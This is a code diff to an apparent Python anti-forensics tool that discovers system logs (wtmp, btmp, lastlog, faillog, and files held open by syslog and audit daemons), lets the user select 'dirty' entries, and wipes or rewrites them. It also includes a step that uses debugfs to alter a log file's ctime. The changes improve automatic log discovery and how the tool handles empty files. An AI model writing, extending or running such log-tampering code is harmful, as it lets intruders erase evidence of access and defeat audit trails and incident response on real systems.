@@ -29,11 +29,11 @@ args = parser.parse_args()
 
 #Constants
 UTMP_STRUCT = struct.Struct('hi32s4s32s256shhiii4i20s') #utmp struct
-UTMPX_STRUCT = struct.Struct('32s4s32sih6xiii20x2x16s20x222x') #utmpx struct, big-endian
-#UTMPX_STRUCT = struct.Struct('32s4s32siHHHbbIII5IH257sb') #utmpx struct
+UTMPX_STRUCT = struct.Struct('32s4s32sih6xiii20x2x16s20x222x') #utmpx struct
 LASTLOG_STRUCT = struct.Struct('hh32s256s') #lastlog struct
-UTMP_FILES = ['/var/log/wtmp','/var/log/btmp']
+UTMP_FILES = ['/var/log/btmp','/var/log/wtmp']
 UTMPX_FILES = ['/var/share/adm/wtmpx','/var/share/adm/btmpx']
+LASTLOG_FILES = ['/var/log/lastlog','/var/log/faillog']
 BLOCKSIZE = 65536
 UTMPX_RECORD_SIZE = 372
 
@@ -282,12 +282,8 @@ class UtmpFile:
         elif self._size % 384 == 0:
             self._line_size = 384
 
-        if self._size != 0:
-            self._hash = get_hash(self.path, self._line_size)
-            self._main()
-        else:
-            print(fail+self.path+' is empty')
-            sleep(1)
+        self._hash = get_hash(self.path, self._line_size)
+        self._main()
 
     def _main(self):
         self._make_list()
@@ -305,8 +301,9 @@ class UtmpFile:
                 wiper(self.path)
         elif self._select() == None:
             print(bad+self.path+' has not been changed because no dirty lines were selected!')
-        sleep(0.5)
+        sleep(1)
         print(success+'All actions on '+self.path+' completed.')
+        sleep(1.5)
 
     def _make_list(self):
         #Get binary
@@ -413,12 +410,8 @@ class UtmpxFile:
         self.lines = []
         self.dirty_lines = []
 
-        if self._size != 0:
-            self._hash = get_hash(self.path, UTMPX_RECORD_SIZE)
-            self._main()
-        else:
-            print(fail+self.path+' is empty')
-            sleep(1)
+        self._hash = get_hash(self.path, UTMPX_RECORD_SIZE)
+        self._main()
 
     def _main(self):
         self._make_list()
@@ -437,8 +430,9 @@ class UtmpxFile:
                 wiper(self.path)
         elif self._select() == None:
             print(bad+self.path+' has not been changed because no dirty lines were selected!')
-        sleep(0.5)
+        sleep(1)
         print(success+'All actions on '+self.path+' completed.')
+        sleep(1.5)
 
     def _make_list(self):
         #Get binary
@@ -560,13 +554,8 @@ class AsciiFile:
         self.fstype = None
         self.lines = []
         self.dirty_lines = []
-
-        if self._size != 0:
-            self._hash = get_hash(self.path, BLOCKSIZE)
-            self._main()
-        else:
-            print(fail+self.path+' is empty')
-            sleep(1)
+        self._hash = get_hash(self.path, BLOCKSIZE)
+        self._main()
 
     def _main(self):
         self._make_list()
@@ -585,8 +574,9 @@ class AsciiFile:
                 wiper(self.path)
         elif self._select() == None:
             print(bad+self.path+' has not been changed because no dirty lines were selected!')
-        sleep(0.5)
+        sleep(1)
         print(success+'All actions on '+self.path+' completed.')
+        sleep(1.5)
 
     def _make_list(self):
         text = ''
@@ -689,27 +679,42 @@ def get_os():
     return system_os
 
 def get_linux_logs():
-    btmp_path = '/var/log/btmp'
-    wtmp_path = '/var/log/wtmp'
-    auth_path = '/var/log/auth.log'
-    syslog_path = '/var/log/syslog'
-    if os.path.isfile(btmp_path):
-        btmp_path = '/var/log/btmp'
-    else:
-        print('that did not go well')
-    if os.path.isfile(wtmp_path):
-        wtmp_path = '/var/log/wtmp'
-    else:
-        print('that did not go well')
-    if os.path.isfile(auth_path):
-        auth_path = '/var/log/auth.log'
-    else:
-        print('that did not go well')
-    if os.path.isfile(syslog_path):
-        syslog_path = '/var/log/syslog'
-    else:
-        print('that did not go well')
-    return btmp_path, wtmp_path, auth_path, syslog_path
+    print(status+'Discovering logs...')
+    not_logs = ['/proc/sys/kernel/hostname','/proc/kmsg']
+    log_processes = ['syslogd','rsyslogd','systemd-journal','auditd']
+    pids = [pid for pid in os.listdir('/proc') if pid.isdigit()]
+    log_files = {}
+
+    for log in UTMP_FILES:
+        if os.path.getsize(log) == 0:
+            log_files[log] = 'empty'
+        elif os.path.isfile(log) and get_file_type(log) == 'data':
+            log_files[log] = 'utmp'
+
+    for pid in pids:
+        comm = '/proc/'+pid+'/comm'
+        fd = '/proc/'+pid+'/fd/'
+        try:
+            with open(comm, 'r') as f:
+                process = f.read().rstrip()
+                if process in log_processes:
+                    proc_dir = os.listdir(fd)
+                    for link in proc_dir:
+                        file = os.readlink(fd+link)
+                        if os.path.isfile(file) and file not in not_logs and os.path.getsize(file) != 0:
+                            log_files[file] = process
+        except IOError: # proc has already terminated
+            continue
+
+    for log in LASTLOG_FILES:
+        if os.path.getsize(log) == 0:
+            log_files[log] = 'empty'
+        elif os.path.isfile(log) and get_file_type(log) == 'data':
+            log_files[log] = 'lastlog'
+    sleep(2)
+    print(success+str(len(log_files))+' logs discovered!')
+    sleep(1)
+    return log_files
 
 def get_sunos_logs():
     btmpx_path = '/var/share/adm/btmpx'
@@ -791,7 +796,7 @@ def touchback_c(log):
     print(status+'Checking if ctime can be altered...')
     sleep(1)
     if 'ext' in log.fstype and which('debugfs'):
-        print({success}+'Log is stored on '+log.fstype+' filesystem and debugfs is present, ctime can be changed!')
+        print(success+'Log is stored on '+log.fstype+' filesystem and debugfs is present, ctime can be changed!')
         get_ctime(log)
         while True:
             proceed = input('\nDo you want to use the native debugfs binary to edit the inode table? (y/n) ')
@@ -840,11 +845,18 @@ def main():
         #Find logs based on OS and user input
         system_os = get_os()
         if system_os == 'Linux':
-            btmp_path, wtmp_path, auth_log_path, syslog_path = get_linux_logs()
-            btmp = UtmpFile(btmp_path)
-            wtmp = UtmpFile(wtmp_path)
-            auth = AsciiFile(auth_log_path)
-            syslog = AsciiFile(syslog_path)
+            log_files = get_linux_logs()
+            for key in log_files:
+                if log_files[key] == 'empty':
+                    print(success+key+' is empty!')
+                    sleep(1.5)
+                elif log_files[key] == 'utmp':
+                    key = UtmpFile(key)
+                elif log_files[key] == 'rsyslogd' or log_files[key] == 'syslogd':
+                    key = AsciiFile(key)
+                else:
+                    print(fail+'Cannot clean '+key)
+                    sleep(1.5)
         elif system_os == 'SunOS':
             btmpx_path, wtmpx_path = get_sunos_logs()
             btmpx = UtmpxFile(btmpx_path)
